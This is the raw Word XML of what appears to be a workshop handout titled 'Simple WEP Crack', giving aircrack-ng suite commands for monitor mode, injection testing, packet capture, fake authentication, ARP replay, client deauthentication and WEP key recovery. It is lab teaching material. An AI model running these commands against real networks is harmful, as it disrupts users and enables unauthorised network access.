    <w:p w14:paraId="1B1CB6DE"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aireplay</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arpreplay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> –e BSIDES wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37A017EC"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13C29832"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3:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B557960"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bookmarkStart w:id="1" w:name="OLE_LINK1"/>
      <w:bookmarkStart w:id="2" w:name="OLE_LINK2"/>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</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deauth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0 –e BSIDES –h </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>client_mac</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="091E2F18"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r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Ctr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-C</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="1"/>
    <w:bookmarkEnd w:id="2"/>
    <w:p w14:paraId="66016FAD"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60263662"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4:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35013514"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aircrack</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channel1.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5E1430"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563939B2"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56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>Simple WEP Crack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C674DB5"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521D161C" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40E605AA"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53742E43" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B1FA293" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00540687"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airmon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-zc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> start wlan0 9  </w:t>
      </w:r>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0DF"/>
      </w:r>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>channel 9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77AC99E5" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="739DDE00" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00EC3B33" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC3B33">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Step 2 - Test Wireless Device Packet Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5A9E31" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00EC3B33" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EC3B33">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>The purpose of this step ensures that your card is within distance of your AP and can inject packets to it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="517363F0" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="006B3EAA" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:strike/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52CDD97C" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="006B3EAA" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:strike/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006B3EAA">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:strike/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E1D4815" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="006B3EAA" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:strike/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="046325E6" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="001214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12143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -9 -e BSIDES -a 00:14:6C:7E:40:80  wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB19AFB" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="0012143E" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A937264" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="0012143E" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45982CB0"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-9 means injection test</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F724EA"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e</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> BSIDES is the wireless network name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19502211"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a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32379FCC"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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0012143E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the wireless interface name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A12EEC2" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="002E6DDC" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="335E5A99" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45C67C6B" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="007F2182"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3 - Start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to capture the IVs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9FF0BB"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14E32A4D"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9DA82D1"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airodump</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-c 9 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 -w output wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED98AA0" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AA8223E"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1F36AA1F"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0F293C02"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3BEFDCE9"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IVs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BFABBB8"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interface name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D008352" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77BAB5D4" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20C9F3B3"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7E96D897" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C000C64"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28E85C21" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="752324F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associate with an access point, use fake authentication:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604D3247" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C8EAA08"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-1 0 -e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSIDES</w:t>
      </w:r>
      <w:r w:rsidRPr="002D638E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581DBF62" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08440193"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3FD1841"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0F9843C4"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5F6C7AFC"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5FB70C02"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0C54893D"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00:0F:B5:88:AC:82 is our card MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22219AD7"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26FFE38C" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41C92BA1"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Start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in ARP request replay mode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D9B9B0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and enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35981A37"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7327750" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>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-3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56180EE7" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7400A1C3"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574A9A9E" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="641A8513"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68701665" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="046A079C"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5 - Run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to obtain the WEP key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72B2AC4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purpose of this step is to obtain the WEP key from the IVs gathered in the previous steps.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B874FD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Note: For learning purposes, you should use a </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>64 bit</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> WEP key on your AP to speed up the cracking process. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">If this is the case, then </w:t>
      </w:r>
      <w:r w:rsidRPr="00037A0F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>you can include ”-n 64” to limit the checking of keys to 64 bits</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="210EF2A7" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
